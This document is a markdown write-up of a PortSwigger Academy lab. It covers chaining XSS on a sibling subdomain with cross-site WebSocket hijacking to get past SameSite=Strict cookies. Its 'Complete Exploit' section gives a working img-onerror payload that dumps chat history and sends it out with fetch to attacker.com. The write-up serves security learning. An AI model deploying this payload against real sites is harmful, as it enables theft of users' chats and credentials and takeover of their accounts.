# PortSwigger Lab: SameSite Strict bypass via sibling domain

![PortSwigger](https://img.shields.io/badge/Platform-PortSwigger%20Academy-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-ff4444)
![Type](https://img.shields.io/badge/Type-CSWSH%20%2B%20SameSite%20Bypass-red)
![Status](https://img.shields.io/badge/Status-Completed-success)

Writeup on bypassing SameSite=Strict via sibling domain + XSS + CSWSH chain.

## Techniques Used

- Cross-site WebSocket Hijacking (CSWSH)
- SameSite=Strict bypass via sibling domain
- XSS vulnerability exploitation
- eTLD+1 same-site concept
- READY message chat history leak
- Credential exfiltration via fetch
- Account takeover

## Attack Summary

```
SameSite=Strict blocks normal CSWSH
→ Find sibling domain in HTTP history
→ Discover XSS on sibling domain
→ Sibling = same-site (eTLD+1 level)
→ Execute CSWSH from sibling (cookie included)
→ READY dumps chat history
→ Fetch exfiltrates to attacker
→ Extract credentials from chat
→ Login to victim account
```

## Key Vulnerabilities

| Vulnerability | Impact |
|---------------|--------|
| **No CSRF token** | WebSocket vulnerable to CSRF |
| **SameSite=Strict** | Blocks cross-site but not same-site |
| **Sibling domain exists** | Can be used to bypass SameSite |
| **XSS on sibling** | Code execution in same-site context |
| **READY message leak** | Dumps entire chat history |
| **Information disclosure** | Support agent reveals password |

## SameSite=Strict Bypass

### The Problem

```
Attacker domain: exploit-server.net
Target domain: 0a15.web-security-academy.net
Different sites → SameSite=Strict blocks cookie
```

### The Solution

```
Sibling domain: cms-0a15.web-security-academy.net
Both under: web-security-academy.net (eTLD+1)
Same-site → SameSite=Strict ALLOWS cookie
```

### Why It Works

Cookies use eTLD+1 for SameSite checks:
- `cms-example.com` and `www-example.com` = same site
- Subdomains are not considered different sites
- XSS on subdomain = code in same-site context
- Session cookie included

## Attack Chain

1. **Discover READY** - Dumps chat history
2. **Verify SameSite=Strict** - Blocks normal CSWSH
3. **Find sibling domain** - Search HTTP history
4. **Test XSS on sibling** - Confirm vulnerability
5. **Chain exploits** - XSS + sibling = same-site context
6. **Execute CSWSH** - From sibling (cookie included)
7. **Exfiltrate chat** - Fetch messages to attacker server
8. **Extract credentials** - Parse chat for password
9. **Account takeover** - Login with stolen credentials

## Complete Exploit

```html
<img src=x onerror="
  websocket = new WebSocket('wss://0a15.web-security-academy.net/chat');
  websocket.onopen = function(e) {
    websocket.send('READY');
  };
  websocket.onmessage = function(e) {
    fetch('https://attacker.com/exfil?data=' + e.data, {mode:'no-cors'})
  };
">
```

**Executed on sibling domain (same-site context):**
1. Creates WebSocket to main domain
2. Sends READY to dump chat
3. Fetches each message to attacker
4. Browser includes session cookie (same-site)

## eTLD+1 Concept

Effective Top-Level Domain + 1:

```
Domain: example.com
eTLD+1: example.com (no subdomain)

Domain: www.example.com
eTLD+1: example.com (same as others)

Domain: api.example.com
eTLD+1: example.com (same as others)

Domain: other.com
eTLD+1: other.com (different)
```

Subdomains under same eTLD+1 = same-site for SameSite purposes.

## Why Hard

- Must discover sibling domain (not obvious)
- Must find XSS on sibling (separate vulnerability)
- Must chain multiple exploits (CSWSH + XSS + eTLD+1 concept)
- Requires understanding SameSite nuances

## References

- [PortSwigger — CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)
- [PortSwigger — SameSite Cookies](https://portswigger.net/web-security/csrf/samesite-cookies)
- [MDN — eTLD+1](https://wiki.mozilla.org/Public_Suffix_List)
- [OWASP — XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
